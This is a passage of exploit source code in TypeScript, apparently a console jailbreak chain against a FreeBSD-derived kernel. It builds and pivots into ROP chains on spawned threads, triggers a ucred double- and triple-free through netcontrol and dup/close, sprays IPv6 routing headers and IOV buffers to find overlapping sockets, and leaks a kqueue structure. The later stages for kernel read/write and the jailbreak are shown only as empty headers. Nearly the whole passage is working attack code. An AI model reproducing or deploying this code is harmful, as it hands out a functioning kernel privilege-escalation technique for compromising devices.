  for (let i = rop.length - 1; i >= 0; i--) {
    rop_stack_top = rop_stack_top.sub(new BigInt(0, 8))
    mem.view(rop_stack_top).setBigInt(0, rop[i]!, true)
  }

  // Write pivot target to thread's initial stack
  const initial_stack_top = worker.stack.add(new BigInt(0, worker.stack_size))
  const pivot_stack = initial_stack_top.sub(new BigInt(0, 8))
  mem.view(pivot_stack).setBigInt(0, rop_stack_top, true)  // Value for POP_RSP_RET

  // Setup thr_param
  mem.view(worker.thr_param).setBigInt(0x00, gadgets.POP_RSP_RET, true)  // Entry: pop RSP (pivots to ROP stack)
  mem.view(worker.thr_param).setBigInt(0x08, new BigInt(0, 0), true)
  mem.view(worker.thr_param).setBigInt(0x10, worker.stack, true)
  mem.view(worker.thr_param).setBigInt(0x18, new BigInt(0, worker.stack_size), true)
  mem.view(worker.thr_param).setBigInt(0x20, worker.tls, true)
  mem.view(worker.thr_param).setBigInt(0x28, new BigInt(0, 0x40), true)
  mem.view(worker.thr_param).setBigInt(0x30, worker.child_tid, true)
  mem.view(worker.thr_param).setBigInt(0x38, worker.parent_tid, true)

  return thr_new(worker.thr_param, new BigInt(0, 0x68))
}

// Spawn all IOV workers ONCE - they loop infinitely via stack pivoting
log('Spawning ' + IOV_WORKER_NUM + ' looping IOV workers (stack pivoting)...')
for (let w = 0; w < IOV_WORKER_NUM; w++) {
  const ret = spawnWorker(w)
  if (!ret.eq(0)) {
    throw new Error('Failed to spawn IOV worker ' + w + ': ' + ret.toString())
  }
}
log('All IOV workers spawned - they will loop infinitely without respawn!')
log('Spray workers will be spawned on-demand (one-shot execution)')

// Spawn twin search worker - it blocks waiting for signal
log('Spawning twin search worker (will block until signaled)...')
function spawnTwinSearchWorker () {
  mem.view(twin_worker.child_tid).setBigInt(0, new BigInt(0, 0), true)
  mem.view(twin_worker.parent_tid).setBigInt(0, new BigInt(0, 0), true)

  const result = buildTwinSearchROP()
  const rop = result.rop
  twin_worker.socket_data_array = result.socket_data_array  // Store for later JavaScript access

  log('  Twin search ROP chain: ' + rop.length + ' gadgets (' + (rop.length * 8) + ' bytes)')

  if (rop.length * 8 > twin_worker.rop_stack_size) {
    throw new Error('Twin search ROP too large!')
  }

  let rop_stack_top = twin_worker.rop_stack.add(new BigInt(0, twin_worker.rop_stack_size))
  for (let i = rop.length - 1; i >= 0; i--) {
    rop_stack_top = rop_stack_top.sub(new BigInt(0, 8))
    mem.view(rop_stack_top).setBigInt(0, rop[i]!, true)
  }

  const initial_stack_top = twin_worker.stack.add(new BigInt(0, twin_worker.stack_size))
  const pivot_stack = initial_stack_top.sub(new BigInt(0, 8))
  mem.view(pivot_stack).setBigInt(0, rop_stack_top, true)

  mem.view(twin_worker.thr_param).setBigInt(0x00, gadgets.POP_RSP_RET, true)
  mem.view(twin_worker.thr_param).setBigInt(0x08, new BigInt(0, 0), true)
  mem.view(twin_worker.thr_param).setBigInt(0x10, twin_worker.stack, true)
  mem.view(twin_worker.thr_param).setBigInt(0x18, new BigInt(0, twin_worker.stack_size), true)
  mem.view(twin_worker.thr_param).setBigInt(0x20, twin_worker.tls, true)
  mem.view(twin_worker.thr_param).setBigInt(0x28, new BigInt(0, 0x40), true)
  mem.view(twin_worker.thr_param).setBigInt(0x30, twin_worker.child_tid, true)
  mem.view(twin_worker.thr_param).setBigInt(0x38, twin_worker.parent_tid, true)

  return thr_new(twin_worker.thr_param, new BigInt(0, 0x68))
}

// twin search is done in main thread now, no seperate worker needed

// Pin main thread to CPU core 4 and set real-time priority
log('Pinning main thread to CPU 4 with real-time priority...')

// Pin to CPU 4
const CPU_LEVEL_WHICH = 3  // CPU_LEVEL_WHICH
const CPU_WHICH_TID = 1    // CPU_WHICH_TID
const MAIN_CORE = 4        // CPU core 4
const CPU_SET_SIZE = 0x10  // 16 bytes
const main_cpumask = mem.malloc(CPU_SET_SIZE)
// Zero out the buffer
mem.view(main_cpumask).setBigInt(0, new BigInt(0, 0), true)
mem.view(main_cpumask).setBigInt(8, new BigInt(0, 0), true)
// Set bit for CPU 4 using 16-bit short (matching Java putShort)
mem.view(main_cpumask).setUint16(0, 1 << MAIN_CORE, true)

cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, new BigInt(0xffffffff, 0xffffffff), CPU_SET_SIZE, main_cpumask)

// Set real-time priority
const RTP_SET = 1
const RTP_PRIO_REALTIME = 2
const main_rtp = mem.malloc(4)
mem.view(main_rtp).setUint16(0, RTP_PRIO_REALTIME, true)  // offset 0x00: type = 2
mem.view(main_rtp).setUint16(2, 256, true)                 // offset 0x02: prio = 256
rtprio_thread(RTP_SET, 0, main_rtp)

log('Main thread pinned to CPU 4 and set to real-time priority')

// Fast ROP pktopts spray - spawns ALL spray workers simultaneously
// Each does 10 passes of 128 setsockopt calls = massive memory pressure!
function doFastPkoptsSpray () {
  // Spawn all spray workers in parallel
  for (let w = 0; w < SPRAY_WORKER_NUM; w++) {
    const ret = spawnSprayWorker(w)
    if (!ret.eq(0)) {
      throw new Error('Failed to spawn spray worker ' + w + ': ' + ret.toString())
    }
  }
  // Small yield to let workers execute in parallel on different CPUs
  sched_yield()
  sched_yield()  // Extra yield to ensure they finish
}

// iov spray with worker 0 only for double/triple-free
function doIOVSpraySingle () {
  const worker = workers[0]!
  // signal worker to start spray
  write_sys(worker.ctrl_sock1, worker.signal_buf, 1)
  sched_yield()

  // wake worker with iov socketpair
  write_sys(iov_ss1, worker.signal_buf, 1)

  // wait for completion
  const done = read_sys(worker.ctrl_sock0, worker.signal_buf, 1)
  const done_val = (done instanceof BigInt) ? done.lo : done
  if (done_val !== 1) {
    throw new Error('worker didnt signal completion')
  }

  // Read ONE byte back from iov_ss0 (matching Java: read(iovSs0, tmp, Int8.SIZE))
  const consumed = read_sys(iov_ss0, worker.signal_buf, 1)
  const consumed_val = (consumed instanceof BigInt) ? consumed.lo : consumed
  if (consumed_val !== 1) {
    throw new Error('Failed to read byte from iov_ss0! read returned: ' + consumed_val)
  }

  // Worker auto-loops via stack pivoting - no respawn needed
}

// IOV spray using all workers (for better coverage when needed)
function doIOVSpray () {
  // Signal all workers to start
  for (let w = 0; w < IOV_WORKER_NUM; w++) {
    const worker = workers[w]!
    write_sys(worker.ctrl_sock1, worker.signal_buf, 1)
  }

  // Yield to let workers enter recvmsg (IOV allocated here!)
  sched_yield()

  // Write ONE byte to iov_ss1 - wakes ALL workers since they're all blocking on iov_ss0
  write_sys(iov_ss1, workers[0]!.signal_buf, 1)

  // Wait for all workers to signal completion
  for (let w = 0; w < IOV_WORKER_NUM; w++) {
    const worker = workers[w]!
    const done = read_sys(worker.ctrl_sock0, worker.signal_buf, 1)
    const done_val = (done instanceof BigInt) ? done.lo : done
    if (done_val !== 1) {
      throw new Error('Worker ' + w + ' did not signal completion! read returned: ' + done_val)
    }
  }

  // Read ONE byte back from iov_ss0
  const consumed = read_sys(iov_ss0, workers[0]!.signal_buf, 1)
  const consumed_val = (consumed instanceof BigInt) ? consumed.lo : consumed
  if (consumed_val !== 1) {
    throw new Error('Failed to read byte from iov_ss0! read returned: ' + consumed_val)
  }

  // Workers automatically pivot RSP back and loop - no respawn needed!
}

// ============================================================================
// Trigger ucred UAF setup with restart on twin failure
// ============================================================================

let exploit_restart_count = 0
let found_twins = false

while (!found_twins) {
  if (exploit_restart_count > 0) {
    log('retry attempt ' + (exploit_restart_count + 1))
    sched_yield()
  }

  exploit_restart_count++

  // trigger triple-free
  const dummy_sock_result = socket(AF_UNIX, SOCK_STREAM, 0)
  const dummy_sock = ((dummy_sock_result instanceof BigInt) ? dummy_sock_result.lo : dummy_sock_result) & 0xFFFFFFFF

  mem.view(set_buf).setUint32(0, dummy_sock, true)
  netcontrol_sys(new BigInt(0xffffffff, 0xffffffff), new BigInt(0, NET_CONTROL_NETEVENT_SET_QUEUE), set_buf, new BigInt(0, 8))
  close_sys(dummy_sock)

  setuid_sys(1)

  const uaf_sock_result = socket(AF_UNIX, SOCK_STREAM, 0)
  uaf_sock = ((uaf_sock_result instanceof BigInt) ? uaf_sock_result.lo : uaf_sock_result) & 0xFFFFFFFF
  log('uaf socket: ' + uaf_sock)

  setuid_sys(1)

  mem.view(clear_buf).setUint32(0, uaf_sock, true)
  netcontrol_sys(new BigInt(0xffffffff, 0xffffffff), new BigInt(0, NET_CONTROL_NETEVENT_CLEAR_QUEUE), clear_buf, new BigInt(0, 8))

  // reset refcount with iov spray
  log('reseting cr_refcnt...')
  for (let reset_i = 0; reset_i < 32; reset_i++) {
    doIOVSpraySingle()
  }

  // double free the ucred
  log('triggering double-free...')
  const dup_fd = dup_sys(uaf_sock)
  const dup_fd_num = (dup_fd instanceof BigInt) ? dup_fd.lo : dup_fd
  if (dup_fd_num < 0) {
    log('dup failed, cant double-free')
    throw new Error('dup_sys failed with: ' + dup_fd_num)
  }
  close_sys(dup_fd_num)
  log('ucred double-freed, searching for twins...')

  // Simple spray and check loop, no ROP needed
  const check_len_buf = mem.malloc(4)
  const leak_buf = mem.malloc(8)

  try {
    for (let attempt = 0; attempt < TWIN_TRIES; attempt++) {
      // tag and spray all sockets
      for (let i = 0; i < IPV6_SOCK_NUM; i++) {
        mem.view(rthdr_buf).setUint32(4, RTHDR_TAG | i, true)
        setsockopt(ipv6_sockets[i]!, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
      }

      sched_yield()

      // check for shared pktopts
      for (let i = 0; i < IPV6_SOCK_NUM; i++) {
        mem.view(check_len_buf).setUint32(0, 8, true)
        getsockopt(ipv6_sockets[i]!, IPPROTO_IPV6, IPV6_RTHDR, leak_buf, check_len_buf)
        const val = mem.view(leak_buf).getUint32(4, true)
        const j = val & 0xFFFF

        if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j < IPV6_SOCK_NUM) {
          twins[0] = i
          twins[1] = j
          found_twins = true
          log('twins found: sockets ' + i + ' and ' + j)
          break
        }
      }

      if (found_twins) {
        break
      }

      if (attempt < TWIN_TRIES - 1) {
        sched_yield()
      }
    }
  } catch (e) {
    log('twin search crashed: ' + (e as Error).message)
    // will cleanup and retry
  }

  if (!found_twins) {
    log('no twins, cleaning up for retry...')

    try {
      // close uaf socket
      if (typeof uaf_sock !== 'undefined' && uaf_sock >= 0) {
        try { close_sys(uaf_sock) } catch (e) {}
        uaf_sock = -1
      }

      if (typeof dup_fd_num !== 'undefined' && dup_fd_num >= 0) {
        try { close_sys(dup_fd_num) } catch (e) {}
      }

      // close all ipv6 sockets (worker threads stay alive)
      for (let i = 0; i < IPV6_SOCK_NUM; i++) {
        try {
          if (ipv6_sockets[i] !== undefined && ipv6_sockets[i]! >= 0) {
            close_sys(ipv6_sockets[i]!)
          }
        } catch (e) {}
      }

      sched_yield()

      // recreate fresh sockets
      for (let i = 0; i < IPV6_SOCK_NUM; i++) {
        try {
          const fd = socket(AF_INET6, SOCK_STREAM, 0)
          ipv6_sockets[i] = (fd instanceof BigInt) ? fd.lo : fd
        } catch (e) {
          log('error creating socket ' + i)
        }
      }

      // reinit pktopts
      for (let i = 0; i < IPV6_SOCK_NUM; i++) {
        try {
          if (ipv6_sockets[i] !== undefined && ipv6_sockets[i]! >= 0) {
            setsockopt(ipv6_sockets[i]!, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)
          }
        } catch (e) {}
      }

      // let kernel cleanup
      const cleanup_start = Date.now()
      while (Date.now() - cleanup_start < 500);

      log('retrying exploit...')
    } catch (e) {
      log('cleanup error: ' + (e as Error).message)
    }

    // loop continues to retry
  } else {
    // twins found! continue with tripple-free inside the loop
    log('twin sockets: [' + twins[0] + ', ' + twins[1] + ']')

    // free one twin's rthdr
    setsockopt(ipv6_sockets[twins[1]!]!, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)

    // spray IOV until reclaim (first_int == 1)
    log('iov reclaim...')
    let uaf_timeout = UAF_TRIES
    let reclaim_found = false

    try {
      while (uaf_timeout-- > 0) {
        const current_attempt = UAF_TRIES - uaf_timeout

        // log progress every 5000 iterations
        if (current_attempt % 5000 === 0 && current_attempt > 0) {
          log('  iov reclaim attempt ' + current_attempt + ' / ' + UAF_TRIES)
        }

        // signal worker 0
        write_sys(workers[0]!.ctrl_sock1, workers[0]!.signal_buf, 1)
        sched_yield()

        // check if reclaimed
        mem.view(leak_len_buf).setUint32(0, 8, true)
        getsockopt(ipv6_sockets[twins[0]!]!, IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

        if (mem.view(leak_rthdr_buf).getUint32(0, true) === 1) {
          log('iov reclaim success after ' + current_attempt + ' tries')
          reclaim_found = true
          break
        }

        // complete the spray cycle
        write_sys(iov_ss1, workers[0]!.signal_buf, 1)
        read_sys(workers[0]!.ctrl_sock0, workers[0]!.signal_buf, 1)
        read_sys(iov_ss0, workers[0]!.signal_buf, 1)
      }
    } catch (e) {
      log('iov reclaim crashed at attempt ' + (UAF_TRIES - uaf_timeout) + ': ' + (e as Error).message)
      reclaim_found = false
    }

    if (!reclaim_found) {
      log('iov reclaim failed, restarting exploit...')
      // trigger cleanup and restart by setting found_twins to false
      // this will jump back to the top of the while loop
      found_twins = false
    } else {
      // reclaim succeeded, continue with tripple-free
      const triplets = [-1, -1, -1]
      triplets[0] = twins[0]!

      // third free
      const dup_fd2 = dup_sys(uaf_sock)
      close_sys(dup_fd2.lo)
      log('tripple-free complete')

      const findTriplet = (master: number, other: number) => {
        const max_attempts = 50000
        let attempt = 0

        while (attempt < max_attempts) {
          // spray all except master/other
          for (let i = 0; i < IPV6_SOCK_NUM; i++) {
            if (i === master || i === other) {
              continue
            }
            mem.view(rthdr_buf).setUint32(4, RTHDR_TAG | i, true)
            setsockopt(ipv6_sockets[i]!, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buf, rthdr_size)
          }

          // check for shared pktopts
          for (let i = 0; i < IPV6_SOCK_NUM; i++) {
            if (i === master || i === other) {
              continue
            }

            mem.view(leak_len_buf).setUint32(0, UCRED_SIZE, true)
            getsockopt(ipv6_sockets[master]!, IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)

            const val = mem.view(leak_rthdr_buf).getUint32(4, true)
            const j = val & 0xFFFF

            if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
              return j
            }
          }

          attempt++
        }

        return -1
      }

      log('finding triplet[1]...')
      triplets[1] = findTriplet(triplets[0], -1)
      if (triplets[1] === -1) {
        throw new Error('triplet[1] not found')
      }
      log('triplet[1]: ' + triplets[1])

      doIOVSpray()

      log('finding triplet[2]...')
      triplets[2] = findTriplet(triplets[0], triplets[1])
      if (triplets[2] === -1) {
        throw new Error('triplet[2] not found')
      }
      log('triplets: [' + triplets[0] + ', ' + triplets[1] + ', ' + triplets[2] + ']')

      // kqueue leak stage
      log('leaking kqueue...')
      setsockopt(ipv6_sockets[triplets[1]!]!, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0), 0)

      // Get kqueue syscall (0x16A = 362)
      fn.register(0x16A, 'kqueue_sys', [], 'bigint')
      const kqueue_sys = fn.kqueue_sys

      // Loop until we reclaim with kqueue structure
      let kq_fd = -1
      let kq_fdp = new BigInt(0, 0)
      const max_attempts = 100

      for (let attempt = 0; attempt < max_attempts; attempt++) {
        // Create kqueue (auto-throws on error)
        kq_fd = kqueue_sys().lo

        // Leak with triplets[0]
        mem.view(leak_len_buf).setUint32(0, 0x100, true)
        getsockopt(ipv6_sockets[triplets[0]!]!, IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
        // Check for kqueue signature at offset 0x08
        const sig = mem.view(leak_rthdr_buf).getUint32(0x08, true)
        if (sig === 0x1430000) {
          // Found kqueue! Extract kq_fdp at offset 0xA8
          kq_fdp = mem.view(leak_rthdr_buf).getBigInt(0xA8, true)
          log('Found kqueue structure after ' + (attempt + 1) + ' attempts')
          log('kq_fdp: ' + kq_fdp.toString())
          break
        }

        // Not kqueue yet, close and retry
        close_sys(kq_fd)
      }

      if (kq_fdp.lo === 0 && kq_fdp.hi === 0) {
        throw new Error('Failed to leak kqueue after ' + max_attempts + ' attempts')
      }

      // Close kqueue to free the buffer
      close_sys(kq_fd)
      log('Closed kqueue fd ' + kq_fd)

      // Find new triplet[1] to replace the one we freed
      log('Finding new triplet[1] after kqueue leak...')
      triplets[1] = findTriplet(triplets[0], triplets[2])
      if (triplets[1] === -1) {
        throw new Error('Failed to find new triplet[1] after kqueue leak')
      }
      log('Found new triplet[1]: socket[' + triplets[1] + ']')

      // ============================================================================
      // STAGE 4: Leak kqueue structure
      // ============================================================================
    }  // end of reclaim success else block
  }  // end of twins found else block
}  // end of while (!found_twins) loop

// if we get here, exploit will continue with kqueue leak and beyond

// ============================================================================
// STAGE 5: Kernel R/W primitives via pipe corruption
// ============================================================================

// ============================================================================
// STAGE 6: Jailbreak
// ============================================================================
